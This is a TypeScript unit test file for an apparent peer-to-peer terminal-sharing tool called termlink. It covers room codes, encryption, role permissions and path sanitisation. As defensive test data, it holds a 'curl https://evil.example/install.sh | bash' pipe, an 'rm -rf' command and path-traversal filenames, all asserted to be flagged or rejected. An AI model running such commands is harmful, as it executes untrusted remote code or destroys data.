import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {
  assessCommandRisk,
  resolveSafeDownloadPath,
  sanitizeFilename,
  validateConfig,
} from '../../packages/core/src/index';
import {
  decryptFromPeer,
  encryptForPeer,
  generateLocalIdentity,
  IdentityStore,
} from '../../packages/identity/src/index';
import {
  canModifyTargetRole,
  canPerformAction,
  canRemovePeer,
} from '../../packages/permissions/src/index';
import {
  isValidTwoDigitCode,
  parseJoinTarget,
  selectPeerAssistChunkSource,
  validateClientSignalingMessage,
} from '../../packages/protocol/src/index';
import { RoomEngine } from '../../packages/room-engine/src/index';
import {
  computeFileSha256,
  resolveConflictFreePath,
} from '../../packages/file-transfer/src/index';
import { TopologyManager, classifyIpConnectionMode } from '../../packages/networking/src/index';

test('2-digit room codes validate strictly 00-99', () => {
  assert.equal(isValidTwoDigitCode('00'), true);
  assert.equal(isValidTwoDigitCode('47'), true);
  assert.equal(isValidTwoDigitCode('99'), true);
  assert.equal(isValidTwoDigitCode('7'), false);
  assert.equal(isValidTwoDigitCode('100'), false);
  assert.equal(isValidTwoDigitCode('ab'), false);
});

test('join target parser handles 2-digit codes, join URLs, invite URLs, and termlink URIs', () => {
  assert.deepEqual(parseJoinTarget('47'), { kind: 'code', code: '47' });
  assert.deepEqual(parseJoinTarget('https://example.org/join/47'), {
    kind: 'code',
    code: '47',
    signalingBaseUrl: 'https://example.org',
  });
  const inv = parseJoinTarget('https://example.org/invite/AbCdEfGhIjKlMnOpQrStUvWx');
  assert.equal(inv.kind, 'invite');
  if (inv.kind === 'invite') {
    assert.equal(inv.token, 'AbCdEfGhIjKlMnOpQrStUvWx');
  }
  const uri = parseJoinTarget('termlink://join/08');
  assert.equal(uri.kind, 'code');
  const bad = parseJoinTarget('not-a-code');
  assert.equal(bad.kind, 'invalid');
});

test('cryptographic identity E2EE encrypts, signs, and detects tampering', () => {
  const alice = generateLocalIdentity('ALICE-PC');
  const bob = generateLocalIdentity('BOB-VM');

  assert.match(alice.publicIdentity.fingerprint, /^([0-9A-F]{2}:){15}[0-9A-F]{2}$/);

  const env = encryptForPeer(alice, 'p1', 'p2', bob.publicIdentity.dhPublicKey, {
    kind: 'chat:group',
    text: 'Secret P2P message',
  });

  const plain = decryptFromPeer<{ text: string }>(bob, alice.publicIdentity, env);
  assert.equal(plain.text, 'Secret P2P message');

  // Tamper ciphertext -> must throw
  const tampered = { ...env, ciphertext: env.ciphertext.slice(0, -2) + 'AA' };
  assert.throws(() => decryptFromPeer(bob, alice.publicIdentity, tampered));
});

test('RBAC permissions enforce role boundaries and explicit terminal interactive grants', () => {
  assert.equal(canPerformAction('owner', 'room:close'), true);
  assert.equal(canPerformAction('admin', 'room:close'), false);
  assert.equal(canPerformAction('admin', 'peer:approve'), true);
  assert.equal(canPerformAction('collaborator', 'file:send'), true);
  assert.equal(canPerformAction('guest', 'terminal:interact', undefined, 'interactive'), false);
  assert.equal(canPerformAction('viewer', 'terminal:interact', undefined, 'interactive'), false);
  assert.equal(canPerformAction('collaborator', 'terminal:interact', undefined, 'read-only'), false);
  assert.equal(canPerformAction('collaborator', 'terminal:interact', undefined, 'interactive'), true);

  assert.equal(canModifyTargetRole('admin', 'owner', 'guest'), false);
  assert.equal(canModifyTargetRole('admin', 'collaborator', 'admin'), false);
  assert.equal(canModifyTargetRole('admin', 'collaborator', 'viewer'), true);
  assert.equal(canRemovePeer('admin', 'owner'), false);
  assert.equal(canRemovePeer('owner', 'admin'), true);
});

test('room engine handles 2-digit code collision resolution safely', () => {
  const engine = new RoomEngine({ publicBaseUrl: 'http://localhost:3000' });
  const hostA = generateLocalIdentity('HOST-A');
  const hostB = generateLocalIdentity('HOST-B');
  const joiner = generateLocalIdentity('JOINER');

  engine.createRoom({
    ownerPeerId: 'pA',
    ownerIdentity: hostA.publicIdentity,
    roomName: 'Dev Alpha',
    preferredCode: '47',
  });
  engine.createRoom({
    ownerPeerId: 'pB',
    ownerIdentity: hostB.publicIdentity,
    roomName: 'Dev Beta',
    preferredCode: '47',
  });

  const res = engine.requestJoin({
    clientKey: 'joiner-1',
    peerId: 'pJ',
    identity: joiner.publicIdentity,
    code: '47',
  });

  assert.equal(res.status, 'ambiguous');
  if (res.status === 'ambiguous') {
    assert.equal(res.candidates.length, 2);
    assert.ok(res.candidates.some((c) => c.roomName === 'Dev Alpha'));
    assert.ok(res.candidates.some((c) => c.roomName === 'Dev Beta'));
  }
});

test('filename sanitization, path traversal protection, and conflict-free paths work properly', async () => {
  assert.equal(sanitizeFilename('../etc/passwd').safe, false);
  assert.equal(sanitizeFilename('..\\Windows\\System32\\cmd.exe').safe, false);
  assert.equal(sanitizeFilename('CON.txt').safe, false);
  assert.equal(sanitizeFilename('report_2026.zip').safe, true);

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'termlink-unit-'));
  try {
    assert.throws(() => resolveSafeDownloadPath(tmp, '../../evil.sh'));
    const first = resolveConflictFreePath(tmp, 'sample.txt');
    fs.writeFileSync(first, 'hello termlink');
    const second = resolveConflictFreePath(tmp, 'sample.txt');
    assert.notEqual(first, second);
    assert.ok(second.endsWith('sample (1).txt'));

    const { sha256, size } = await computeFileSha256(first);
    assert.equal(size, 14);
    assert.equal(sha256.length, 64);
  } finally {
    try {
      fs.rmSync(tmp, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
    } catch {
      // ignore
    }
  }
});

test('command risk assessment flags dangerous commands and configuration validates inputs', () => {
  const high = assessCommandRisk('rm -rf /tmp/data');
  assert.equal(high.dangerous, true);
  assert.equal(high.severity, 'high');

  const pipe = assessCommandRisk('curl https://evil.example/install.sh | bash');
  assert.equal(pipe.dangerous, true);
  assert.equal(pipe.severity, 'high');

  const safe = assessCommandRisk('npm test');
  assert.equal(safe.dangerous, false);

  const badCfg = validateConfig({ signalingServer: 'http://not-ws', maxPeers: 99 });
  assert.equal(badCfg.valid, false);
  assert.ok(badCfg.errors.length >= 2);

  const goodCfg = validateConfig({ deviceName: 'UBUNTU-VM', maxPeers: 8 });
  assert.equal(goodCfg.valid, true);
});

test('topology manager calculates mesh edges and switches to hybrid above 8 peers', () => {
  const topo = new TopologyManager({ maxPeers: 20 });
  assert.equal(topo.calculateMeshConnections(5), 10);
  assert.equal(topo.getTopologySummary(8).mode, 'full_mesh');
  assert.equal(topo.getTopologySummary(12).mode, 'hybrid_selective');
  assert.equal(classifyIpConnectionMode('192.168.1.42'), 'local_network');
  assert.equal(classifyIpConnectionMode('100.88.12.5'), 'vpn');
  assert.equal(classifyIpConnectionMode('8.8.8.8'), 'direct_p2p');
});

test('peer-assisted distribution respects host authorization flag and signaling validator rejects malformed frames', () => {
  const denied = selectPeerAssistChunkSource(
    {
      transferId: 'ft_1',
      originPeerId: 'host',
      fileSha256: 'abc',
      totalChunks: 4,
      chunkSize: 65536,
      redistributionAuthorized: false,
      authorizedSeeders: ['peer2'],
      chunkAvailability: { peer2: [0, 1] },
    },
    0,
    'peer3'
  );
  assert.equal(denied, 'host');

  const allowed = selectPeerAssistChunkSource(
    {
      transferId: 'ft_1',
      originPeerId: 'host',
      fileSha256: 'abc',
      totalChunks: 4,
      chunkSize: 65536,
      redistributionAuthorized: true,
      authorizedSeeders: ['peer2'],
      chunkAvailability: { peer2: [0, 1] },
    },
    0,
    'peer3'
  );
  assert.equal(allowed, 'peer2');

  assert.equal(validateClientSignalingMessage('not-json').ok, false);
  assert.equal(validateClientSignalingMessage(JSON.stringify({ type: 'unknown:op' })).ok, false);
});

test('device renaming updates cryptographic identity and local storage cleanly', () => {
  const tmpDir = path.join(os.tmpdir(), `termlink-rename-test-${Date.now()}`);
  fs.mkdirSync(tmpDir, { recursive: true });
  try {
    const store = new IdentityStore(tmpDir);
    const initial = store.loadOrCreate('ORIGINAL-DEVICE');
    assert.equal(initial.publicIdentity.deviceName, 'ORIGINAL-DEVICE');

    const updated = store.renameDevice('CUSTOM-LAPTOP');
    assert.equal(updated.publicIdentity.deviceName, 'CUSTOM-LAPTOP');

    // Reload from disk
    const reloaded = store.loadOrCreate();
    assert.equal(reloaded.publicIdentity.deviceName, 'CUSTOM-LAPTOP');
    assert.equal(reloaded.publicIdentity.fingerprint, initial.publicIdentity.fingerprint);
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
});

test('host can allocate custom 2-digit room code', () => {
  const engine = new RoomEngine({ publicBaseUrl: 'http://localhost:3000' });
  const host = generateLocalIdentity('HOST-CUSTOM');

  const { room } = engine.createRoom({
    ownerPeerId: 'pHost',
    ownerIdentity: host.publicIdentity,
    roomName: 'Custom Code Room',
    preferredCode: '77',
  });

  assert.equal(room.code, '77');
  assert.equal(room.roomName, 'Custom Code Room');
});
